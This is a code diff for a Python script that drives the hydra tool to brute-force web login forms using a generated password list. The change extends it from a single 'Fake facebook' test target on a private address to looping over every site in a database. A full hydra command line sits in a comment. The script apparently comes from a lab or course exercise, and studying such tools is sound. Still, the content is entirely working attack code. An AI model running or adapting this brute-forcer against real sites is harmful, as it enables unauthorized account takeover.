@@ -2,7 +2,7 @@ import subprocess
 import re
 
 from ModuleB import moduleB
-from WebsiteInfo import WebsiteInfo
+import WebsiteInfo
 
 # hydra -l arnav -P passwords.txt 10.202.208.81 -s 8080 http-post-form "/login:username=^USER^&password=^PASS^:S=Hello World!"
 
@@ -32,7 +32,7 @@ def grab_success(output_lines, port, service_mode):
 def attack(moduleB, website_info):
     username = moduleB.username
     passwords = moduleB.filename
-    ip_addresss, port, service_mode, address_and_details = website_info.get_attack_info()
+    ip_address, port, service_mode, address_and_details = website_info.get_attack_info()
 
     proc = subprocess.Popen(['hydra', '-l', username, '-P', passwords, ip_address, '-s', port, service_mode, address_and_details], stdout = subprocess.PIPE)
 
@@ -50,17 +50,25 @@ def attack(moduleB, website_info):
     else:
         print('failure')
 
+def attack_all_websites(moduleB):
+    websites = WebsiteInfo.get_all_websites()
+    for k, website_info in websites.items():
+        print 'printing', k, website_info
+        attack(moduleB, website_info) 
+
 if __name__ == '__main__':
     # From Part B
-    username = 'arnav'
+    username = 'arnav@gmail.com'
     module_b = moduleB(username)
+    module_b.write_file()
     
     # From the database of things
-    name = 'Fake facebook'
-    ip_address = '10.202.208.81'
-    port = '8080'
-    service_mode = 'http-post-form'
-    address_and_details = '/login:username=^USER^&password=^PASS^:S=Hello World!'
-    website_info = WebsiteInfo(name, ip_address, service_mode, address_and_details, port)
+    #name = 'Fake facebook'
+    #ip_address = '10.202.208.81'
+    #port = '8080'
+    #service_mode = 'http-post-form'
+    #address_and_details = '/login:username=^USER^&password=^PASS^:S=Hello World!'
+    #website_info = WebsiteInfo(name, ip_address, service_mode, address_and_details, port)
     
-    attack(module_b, website_info)
+    #attack(module_b, website_info)
+    attack_all_websites(module_b)
